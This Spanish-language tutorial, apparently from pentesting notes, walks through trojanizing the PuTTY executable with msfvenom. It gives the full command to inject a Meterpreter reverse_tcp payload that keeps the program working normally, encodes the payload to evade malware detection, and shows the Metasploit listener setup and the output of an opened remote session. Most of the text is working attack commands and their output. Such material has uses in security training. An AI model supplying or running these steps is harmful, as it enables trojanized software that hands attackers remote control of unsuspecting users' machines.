# Backdoors en binarios

Esto consiste en coger un ejecutable o un programa que el usuario utilice frecuentemente y vamos a injectarle codigo malicoso para que cada vez que ejecute ese programa nos devuelva una consexion reversa, pero dicho programa va a seguir funcionando exactamente igual que lo hacia antes de estar `backdoorizado`.

Por ejemplo vamos a utilizar una herramienta que utilizan mucho los administradores y es el programa llamado `PuTTY`:

Primero nos descargaremos el archivo.

```shell
wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
```

Y ahora vamos a utilizar `msfvenom` para incrustar el codigo de la `backdoor` dentro de la aplicacion:

```shell
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
```

Info:

```
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai chosen with final size 435
Payload size: 435 bytes
Final size of exe file: 1889792 bytes
Saved as: puttyX.exe
```

Con esto lo que estamos haciendo es que con el `-a` especificarle la arquitectura en este caso `32 bits` con el `--platform` especificamos el sistema operativo en el que se va a ejecutar en mi caso `windows` con el `-x` el nombre del archivo en el cual queremos injectar la `backdoor` con el `-p` especificamos el `payload` que vamos a utilizar, con el `-e` especificamos el tipo de codificacion que queremos ponerle al codigo para que sea mas complicado de detectar en el sistema como un `malware`, con el `-i` especificamos que le de `3` vueltas de codificacion, con el `-b` especificamos que omita caracteres en los que pueda generar un problema en este caso `\x00` el `0` en `hexadecimal`.

Ahora antes de ejecutarlo en un `windows` lo que tendremos que hacer es ponernos a escuchar en `metasploit`:

```shell
msfconsole -q
```

La configuracion de la escucha:

```shell
use multi/handler
set LHOST <IP>
set LPORT <PORT>
set payload windows/meterpreter/reverse_tcp
exploit
```

Una vez que estemos a la escucha, nos iremos al `windows` nos pasaremos el archivo al mismo y lo ejecutaremos, si lo ejecutamos vemos que se nos inicia la aplicacion normal sin ningun tipo de sospecha:

<figure><img src="../../.gitbook/assets/image (137) (1).png" alt=""><figcaption></figcaption></figure>

Pero si nos vamos al `kali` donde tenemos la escucha, veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.5.186:7777 
[*] Sending stage (176198 bytes) to 192.168.5.181
[*] Meterpreter session 1 opened (192.168.5.186:7777 -> 192.168.5.181:49900) at 2024-11-24 05:21:32 -0500

meterpreter >
```

Veremos que tendremos una shell con el `windows`, por lo que ya tendriamos una `backdoor`.
